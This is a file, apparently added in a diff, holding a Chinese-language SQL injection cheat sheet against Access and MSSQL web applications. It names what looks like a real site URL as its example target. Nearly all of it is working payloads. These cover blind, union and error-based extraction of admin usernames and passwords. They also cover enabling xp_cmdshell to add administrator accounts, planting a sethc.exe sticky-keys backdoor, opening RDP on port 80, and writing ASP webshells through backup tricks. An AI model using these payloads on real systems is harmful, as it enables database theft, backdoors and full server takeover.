@@ -1,0 +1,255 @@
+第一部分
+
+一般都可以通用在 access mssql msyql .等等都可以
+
+mssql msyql 等等有其他的注入查询的方法
+
+http://www.ename.cn/DomainFind.asp?id=2356
+有时候需要 盲注  偏移注入  搜索框注入  登录框注入
+
+判断注入  and 1=1  and 1=2
+          -0       -1 
+
+通用查询
+and （select count(*) from 表名)>=0 
+and （select count(字段名) from 表名)>=0 
+猜字段值长度
+and （select top 1 len(字段名) from 表名)>1
+and （select top 1 len(字段名) from 表名)>n-1  正常
+and （select top 1 len(字段名) from 表名)>n    出错
+说明字段长度为n
+
+猜字段值内容
+and （select top 1 asc(mid(字段名,1,1)) from 表名)>1
+and （select top 1 asc(mid(字段名,1,1)) from 表名)=97
+字段值内容的第一个值为a （a的编码是97）
+and （select top 1 asc(mid(字段名,2,1)) from 表名)>1
+and （select top 1 asc(mid(字段名,2,1)) from 表名)=98
+字段值内容的第二个值为b （a的编码是98）
+...
+...
+以此类推...
+有时候可能 帐号是汉字的话 只需将与汉字的ascii值比较即可
+
+联合查询
+首先判断是否存在注入
+之后 order by 长度
+http://www.ename.cn/DomainFind.asp?id=2356 
+order by 8 正常
+order by 9 出错
+字段数目为 8个
+之后 
+union select 1,2,3,4,5,6,7,8 from 表名
+爆出数字 3. 7
+union select 1,2,字段名1,4,5,6,字段名2,8 from 表名
+
+
+第一部分
+
+sql server 2005下开启xp_cmdshell的办法 2005默认情况下是关闭的
+;EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+
+mssql注入
+首先判断是否是mssql数据库
+
+and user>0  出错提示类型不匹配  --  mssql数据库
+and （select count(*) from sysobjects)>=0 
+正常    --  mssql数据库
+sysobjects     是 mssql系统表  
+msysobjects    是 access系统表
+
+之后判断权限
+and 1=(select is_srvrolemember('sysadmin'))    正常sa权限
+and 1=(select is_srvrolemember('db_owner'))        db权限
+and 1=(select is_srvrolemember('public'))        public权限
+
+sa权限的话
+
+and 1=(Select count(*) FROM master.dbo.sysobjects Where xtype = 'X' AND name = 'xp_cmdshell') //判断XP_CMDSHELL是否存在
+
+and 1=(select count(*) FROM master.dbo.sysobjects where name= 'xp_regread')      //查看XP_regread扩展存储过程是不是已经被删除
+
+删除扩展存储过程：;exec sp_dropextendedproc 'xp_cmdshell'
+恢复扩展存储过程：;exec sp_addextendedproc xp_cmdshell,'xplog70.dll'
+
+恢复不成功的话 自己上传一个xplog70.dll 然后自定义路径恢复
+
+//允许外连
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x0 /f 
+
+//改3389端口到80
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 80 /f
+
+添加和删除一个SA权限的用户test：（需要SA权限）
+exec master.dbo.sp_addlogin test,password
+exec master.dbo.sp_addsrvrolemember test,sysadmin
+
+用XP_CMDSHELL添加用户hacker：
+;exec master.dbo.xp_cmdshell 'net user hacker 123456 /add'
+;exec master.dbo.xp_cmdshell 'net localgroup administrators hacker /add'
+
+通过xp_regwrite写SHIFT后门
+;exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','debugger','REG_sz','c:\windows\system32\cmd.exe on';--
+
+首先开启沙盘模式：
+exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
+
+然后利用jet.oledb执行系统命令
+数字型为ias.mdb 字符型string 为dnary.mdb
+2000的系统为（winnt）ias.mdb 
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c net user admin admin1234 /add")')  
+
+检测SP_OAcreate（执行命令）：
+and
+ 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'SP_OAcreate')
+
+SP_OAcreate执行CMD命令：
+;DECLARE @shell INT EXEC SP_OAcreate 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD @shell,'run',null, 'C:\WINNT\system32\cmd.exe /c net user hacker 123456 /add'
+
+sp_makewebtask直接在web目录里写入一句话马：
+;exec sp_makewebtask 'D:\\wwwroot\\aaa.com\\x.asp','select "<%25execute(request("cmd")%25)"';--
+
+利用下载写入一个webshell代码
+
+db权限的话首先可以利用工具列目录
+之后通过log备份 和差异备份拿shell
+
+
+log备份手记   可以利用工具nbsi进行备份
+
+怎么获知当前库?
+a.   用工具
+b.   and (select db_name())>0  查询库名
+     And 1=(select db_name())  当前数据库名  
+1.恢复当前库
+;alter database 当前库 set RECOVERY FULL--
+
+2.创建表keio
+;create table keio (a image)--
+
+3.备份当前库到D:\cmd1
+;backup log 当前库 to disk = 'D:\keio1' with init--
+
+4.插入一句话代码到创建的表cmd
+;insert into keio (a) values ('<%%25eval(request("a")):response.end%%25>')--
+
+5.备份一句话代码到站点根目录
+;backup log 当前库 to disk = 'D:\www_web\oct.asp'--
+
+6.完成
+;drop table keio--
+---------------------------------- 
+
+差异备份手记   
+
+1.
+;backup database 数据库名 to disk='c:\db.bak'--
+2.
+;create table cmd(cmd image)--
+3.
+;insert into cmd(cmd) values ('<%%25eval(request("a")):response.end%%25>')--
+4.
+;backup database 数据库名 to disk='D:\www_web\aaa.asp' WITH DIFFERENTIAL FORMAT--
+5.
+;drop table cmd--
+
+
+一句话转换成十六进制成功率会比较高,其他的换成16位进制编码也可以
+
+
+
+mssql  having 1=1--  暴库注入
+
+
+having 1=1--  会爆出表名等等内容 如果权限不足的情况下可以爆库注入
+group by 字段名1 having 1=1--
+group by 字段名1,字段名2 having 1=1--
+group by 字段名1,字段名2,...,字段名n having 1=1--
+之后
+union select 1,字段名1,字段名2,4.5.6.7 from 表名
+
+
+order by 与数据类型转换爆错法
+
+方法1：
+and db_name()=0--
+and db_name(n)>0-- 获得所有数据库名
+方法2：
+and 1=(select name from master.dbo.sysdatabases where dbid=1)--
+and 1=(select name from master.dbo.sysdatabases where dbid=2)--
+...
+and 1=(select name from master.dbo.sysdatabases where dbid=n)--
+
+爆当前数据库里面的表名
+and (select top 1 name from (select top 1 name from sysobjects where xtype=0x75 order by name) t order by name desc)=0
+
+and (select top 1 name from (select top 2 name from sysobjects where xtype=0x75 order by name) t order by name desc)=0
+...
+and (select top 1 name from (select top n name from sysobjects where xtype=0x75 order by name) t order by name desc)=0
+
+爆出表名为 adminmaster
+之后爆字段 
+
+and (select col_name(object_id('adminmaster'),1))=0
+and (select col_name(object_id('adminmaster'),2))=0
+爆出username  password
+
+爆内容
+and （select top 1 username from adminmaster)>0 爆出keio用户
+之后继续爆其他的用户名
+and （select top 1 username from adminmaster where username<>'keio')>0
+之后依此类推
+
+确认数据类型联合查询
+and 1=2 union all select 1,null,null,null,null,null,null,null,null,null,null,null from sysobjects--
+
+and 1=2 union all select 1,2,3,'null',5,6,7,8,9 from sysobjects--
+
+查数据库
+and 1=2 union all select 1,2,3,(select name from master.dbo.sysdatabases where dbid=1),5,6,7,8,9 from sysobjects--
+and 1=2 union all select 1,2,3,(select name from master.dbo.sysdatabases where dbid=2),5,6,7,8,9 from sysobjects--
+...
+
+查表
+and 1=2 union all select 1,2,3, (select top 1 name from (select top 1 name from sysobjects where xtype=0x75 order by name) t order by name desc)
+,5,6,7,8,9 from sysobjects--
+
+and 1=2 union all select 1,2,3, (select top 1 name from (select top 2 name from sysobjects where xtype=0x75 order by name) t order by name desc)
+,5,6,7,8,9 from sysobjects--
+...
+表名 若为 adminmaster
+
+
+查字段名
+
+and 1=2 union all select 1,2,3,(select col_name(object_id('adminmaster'),1)),5,6,7,8,9 from sysobjects--
+and 1=2 union all select 1,2,3,(select col_name(object_id('adminmaster'),2)),5,6,7,8,9 from sysobjects--
+...
+and 1=2 union all select 1,2,3,(select col_name(object_id('adminmaster'),n)),5,6,7,8,9 from sysobjects--
+若字段名为username  password
+
+
+爆字段内容
+and 1=2 union all select 1,2,3,(select top 1 username from adminmaster ),5,6,7,8,9 from sysobjects--  keio
+爆字段内容
+and 1=2 union all select 1,2,3,(select password from adminmaster  where username='keio'),5,6,7,8,9 from sysobjects--  
+得到第一个用户keio的密码
+
+爆第二用户
+and 1=2 union all select 1,2,3,(select top 1 username from adminmaster where username<>'keio'),5,6,7,8,9 from sysobjects--
+
+
+mssql2005显错模式爆数据  需要用到/**/代替空格突破过滤
+
+
+
+sql server 2005下开启xp_cmdshell的办法
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+
+SQL2005开启'OPENROWSET'支持的方法：
+exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;
+
+SQL2005开启'sp_oacreate'支持的方法:
+exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;
+
+
